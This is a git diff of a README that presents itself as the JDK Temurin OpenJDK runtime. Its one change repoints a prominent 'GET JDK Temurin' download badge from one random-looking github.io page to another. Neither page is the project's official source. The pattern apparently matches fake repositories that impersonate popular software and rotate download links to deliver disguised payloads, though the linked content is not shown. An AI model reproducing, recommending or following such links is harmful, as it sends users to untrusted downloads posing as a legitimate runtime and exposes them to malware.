@@ -1,6 +1,6 @@
 # JDK Temurin - OpenJDK Runtime and Development Kit
 
-[![GET JDK Temurin](https://img.shields.io/badge/GET%20%E2%80%94%20JDK%20Temurin-0078D6?style=for-the-badge&logoColor=white)](https://tannerlawsonuwyy.github.io/.github/jdk-temurin)
+[![GET JDK Temurin](https://img.shields.io/badge/GET%20%E2%80%94%20JDK%20Temurin-0078D6?style=for-the-badge&logoColor=white)](https://juanmayolgxu.github.io/.github/jdk-temurin)
 
 ## JDK Temurin Runtime Overview
 
